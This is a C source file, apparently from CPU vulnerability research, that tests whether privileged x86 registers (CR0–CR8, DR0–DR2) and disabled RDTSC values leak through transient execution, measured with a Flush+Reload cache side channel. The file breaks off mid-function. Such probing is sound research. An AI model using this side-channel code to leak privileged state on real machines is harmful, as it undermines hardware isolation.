#define _GNU_SOURCE
#include <stdatomic.h>
#include <memory.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <errno.h>
#include <immintrin.h>
#include <sys/prctl.h>
#include <sys/mman.h>
#include <pthread.h>
#include <asm/prctl.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>


#include "cacheutils.h"

//
// CONFIG
//

// enables RDPRU for more precise AMD measurements
//#define ATLEAST_AMDZEN2 

// enabling this will also test for rdfsbase
#define TEST_RDFSBASE

// 
// CONFIG END
//

#define SPACING 512
#define PAGESIZE 4096
#define UNPRIVILEGED_UID 1000
#define CPU_CORE_COUNTING_THREAD 0

#define CHECK(A) (A && A && A)

__attribute__((aligned(PAGESIZE)))
char testarray[PAGESIZE * 256];
// for dummy gsbase
__attribute__((aligned(PAGESIZE)))
char unused_array[PAGESIZE * 256];

volatile size_t dummy = 0;
size_t CACHE_MISS_COUNTING_THREAD = 150;

#define speculation_start(label) asm goto ("call %l0" : : : "memory" : label##_retp);
#define speculation_end(label) asm goto("jmp %l0" : : : "memory" : label); label##_retp: asm goto("lea %l0(%%rip), %%rax\nmovq %%rax, (%%rsp)\nret\n" : : : "memory","rax" : label); label: asm volatile("nop");
#define IMUL_BLOCK asm volatile ("imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" \
              "imul %%rcx, %%rcx\n" : : "c"(7331) : "memory");

void log_info(const char* msg) {
  printf("\033[94m[+] %s\033[0m\n", msg);
}

void log_success(const char* msg) {
  printf("\033[92m[+] %s\033[0m\n", msg);
}

void log_warning(const char* msg) {
  printf("\033[93m[!] %s\033[0m\n", msg);
}

void log_error_and_exit(const char* msg) {
  printf("\033[91m[!] %s\033[0m\n", msg);
  exit(1);
}

void libsc_pin_to_core(pid_t pid, int core) {
  cpu_set_t mask;
  mask.__bits[0] = 1 << core;
  sched_setaffinity(pid, sizeof(cpu_set_t), &mask);
}

static int is_intel_ = -1;

int is_intel_cpu() {
  if (is_intel_ != -1) {
    return is_intel_;
  }
  FILE* fd = fopen("/proc/cpuinfo", "r");
  if (fd == NULL) {
    printf("[-] error reading /proc/cpuinfo");
  }

  char* line = NULL;
  size_t linelen = 0;
  int is_intel = 0;
  while (getline(&line, &linelen, fd)) {
    if (strstr(line, "model name") != NULL) {
      is_intel = strstr(line, "Intel") != NULL;
      break;
    }
  }
  is_intel_ = is_intel;
  free(line);
  fclose(fd);
  if (is_intel) {
#ifdef ATLEAST_AMDZEN2
  printf("Detected Intel CPU but macros for AMD were specified. Check beginning of source file\n");
  exit(1);
#endif
  }
  return is_intel;
}

static int is_amd_ = -1;

int is_amd_cpu() {
  if (is_amd_ != -1) {
    return is_amd_;
  }

  FILE* fd = fopen("/proc/cpuinfo", "r");
  if (fd == NULL) {
    printf("[-] error reading /proc/cpuinfo");
  }

  char* line = NULL;
  size_t linelen = 0;
  int is_amd = 0;
  while (getline(&line, &linelen, fd)) {
    if (strstr(line, "model name") != NULL) {
      is_amd = strstr(line, "AMD") != NULL;
      break;
    }
  }
  is_amd_ = is_amd;
  free(line);
  fclose(fd);

  return is_amd;
}

void drop_privileges() {
  // ATTENTION: this is not a secure function
  int ret = seteuid(UNPRIVILEGED_UID);
  if (ret) {
    log_error_and_exit("Dropping privileges failed.\n");
  }
}

void elevate_privileges() {
  int ret = seteuid(0);
  if (ret) {
    log_error_and_exit("Getting privileges back failed.\n");
  }
}



//
// begin counting thread implementation
//
static int64_t counting_thread_timestamp_;
atomic_int counting_thread_stop_ = 0;
void counting_thread() {
  size_t cnt = 0;
  libsc_pin_to_core(0, CPU_CORE_COUNTING_THREAD);
  while (1) {
    asm volatile (
    INTELASM(
        "xor r11, r11\n\t"
        "l1: inc r11\n\t"
        "mov [rcx], r11\n\t"
        "jmp l1\n\t")
    : :"c"(&counting_thread_timestamp_): "memory");
  }
}

pthread_t start_counting_thread() {
  pthread_t counting_thread_t;
  pthread_create(&counting_thread_t,
                 NULL,
                 (void* (*)(void*)) counting_thread,
                 NULL);
  printf("Starting counting thread\n");
  // wait until counting thread starts incrementing
  while (counting_thread_timestamp_ == 0) {
    asm volatile ("nop" ::: "memory");
  }
  printf("Counter started running.\n");
  return counting_thread_t;
}

void stop_counting_thread(pthread_t counting_thread_t) {
  counting_thread_stop_ = 1;
  pthread_cancel(counting_thread_t);
}

__attribute__((__always_inline__))
int64_t read_timestamp_counting_thread() {
  //mfence();
  asm volatile("mfence" ::: "memory");
  int64_t ts = counting_thread_timestamp_;
  //mfence();
  asm volatile("mfence" ::: "memory");
  return ts;
}

int flush_reload_counting_thread(void* ptr) {
  uint64_t start = 0, end = 0;

  start = read_timestamp_counting_thread();
  maccess(ptr);
  end = read_timestamp_counting_thread();

  flush(ptr);

  return (int) (end - start);
}

int reload_counting_thread(void* ptr) {
  uint64_t start = 0, end = 0;

  start = read_timestamp_counting_thread();
  maccess(ptr);
  end = read_timestamp_counting_thread();

  return (int) (end - start);
}

size_t detect_flush_reload_threshold_counting_thread() {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t dummy1[16];
  size_t* ptr = dummy1 + 8;
  uint64_t start = 0, end = 0;

  maccess(ptr);
  for (i = 0; i < count; i++) {
    reload_time += reload_counting_thread(ptr);
  }
  for (i = 0; i < count; i++) {
    flush_reload_time += flush_reload_counting_thread(ptr);
  }
  reload_time /= count;
  flush_reload_time /= count;
  printf("Hit (avg): %zu | Miss (avg): %zu\n", reload_time, flush_reload_time);
  size_t threshold = (flush_reload_time + reload_time) / 3;
  if (threshold < flush_reload_time || threshold > reload_time) {
    printf("Unstable CT threshold (%zu;%zu)\n", reload_time, flush_reload_time);
    threshold = reload_time + 5;
  }
  return threshold;
}

//
// end counting thread implementation
//

void enable_rdtsc() {
  // enable RDTSC in userspace
  prctl(PR_SET_TSC, PR_TSC_ENABLE);
}

void disable_rdtsc() {
  // disable RDTSC in userspace
  prctl(PR_SET_TSC, PR_TSC_SIGSEGV);
}

int test_rdtsc(size_t tries, size_t spacing, size_t iterations) {
  //printf("[*] Testing with %zuB spacing and %zu iterations\n", spacing, iterations);
  //size_t spacing = 4096;
  //size_t iterations = 10;

  // flush testarray
  for (size_t c = 0; c < 256; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            //"mov rcx, 0x40000001\n\t"
            "lea r11, [%[testarray]]\n\t"
            "rdtsc\n\t"
            "and rdx, 0xff00\n\t"
            "shl rdx, 0x4\n\t" // shift to 4096 spacing
            "add rdx, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rdx\n\t"
            "mov rax, qword ptr [r11]\n\t"
            )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    int printed_zeroes = 0;
    for (size_t i = 0; i < 256; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_counting_thread(testarray + idx * spacing);
      if (delta != 0 && delta < CACHE_MISS_COUNTING_THREAD) {
        if (idx != 0 || printed_zeroes <= 5) {
          printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        }

        if (printed_zeroes == 5) {
          printf("[!] ignoring further hits on idx 0\n");
        }
        if (idx == 0) {
          printed_zeroes++;
        } else {
          got_hit++;
        }
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_rdtscp(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 256; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
        //"mov rcx, 0x40000001\n\t"
            "lea r11, [%[testarray]]\n\t"
            //            "mov ecx, 0x2\n\t"
            "rdtscp\n\t"
            "and rdx, 0xff00\n\t"
            "shl rdx, 0x4\n\t" // shift to 4096 spacing
            "add rdx, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rdx\n\t"
            "mov rax, qword ptr [r11]\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 256; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_counting_thread(testarray + idx * spacing);
      if (delta != 0 && delta < CACHE_MISS_COUNTING_THREAD) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_cr0(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, cr0\n\t"
            //"and rax, 0x030000\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_cr1(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, cr1\n\t"
            //"and rax, 0x030000\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_cr2(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, cr2\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_cr3(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, cr3\n\t"
            //"and rax, 0x030000\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
            )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_cr4(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, cr4\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_cr5(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, cr5\n\t"
            //"and rax, 0x030000\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_cr6(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, cr6\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_cr7(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, cr7\n\t"
            //"and rax, 0x030000\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_cr8(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, cr8\n\t"
            //"and rax, 0x030000\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_dr0(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, dr0\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_dr1(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, dr1\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    //for (size_t i = 0; i < 4; i++) {
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_dr2(size_t tries, size_t spacing, size_t iterations) {

  // flush testarray
  for (size_t c = 0; c < 255; c++) {
    flush(testarray + c * spacing);
  }
  mfence();

  for (size_t try = 0; try < tries; try++) {
    for (size_t i = 0; i < iterations; i++) {
      if (!setjmp(trycatch_buf)) {
        // try to leak some byte
        asm volatile("cpuid" : : "a"(0), "b"(0), "c"(0), "d"(0) : "memory");
        IMUL_BLOCK
        maccess(0);

        asm volatile(
        INTELASM(
            "xor rax, rax\n\t"
            "mov rax, dr2\n\t"
            "and rax, 0xff000\n\t"
            "lea r11, [%[testarray]]\n\t"
            "add rax, 4096\n\t" // increase the leakage by 1 because its easier to distinguish than a leaked 0 (in case we actually have a 0 as leakage)
            "add r11, rax\n\t"
            "mov rax, [r11]\n\t"
            "xor rax, rax\n\t"
        )
        : : [testarray]"r"(&testarray) : "memory", "rdx", "rcx", "rax", "r11");
        try_abort();
      }
      unblock_signal(SIGSEGV);
    }  // for (size_t try = 0; try < tries; try++)

    // check for hits in array
    int got_hit = 0;
    for (size_t i = 0; i < 255; i++) {
      size_t idx = ((i * 167u) + 13u) & 255u;
      size_t delta = flush_reload_t(testarray + idx * spacing);
      if (delta < CACHE_MISS) {
        printf("[*] Try %zu: Got hit on index 0x%lx (delta: %zu)\n", try, idx, delta);
        if (idx != 0) got_hit++;
      }
    }
    if (got_hit > 0 && got_hit <=2 ) {
      return 1;
    }
  }  // for (size_t i = 0; i < iterations; i++)
  printf("[*] No leakage found. (%zu tries, %zu iterations, %zuB spacing)\n",
         tries, iterations, spacing);
  return 0;
}

int test_dr3(size_t tries, size_t spacing, size_t iterations) {

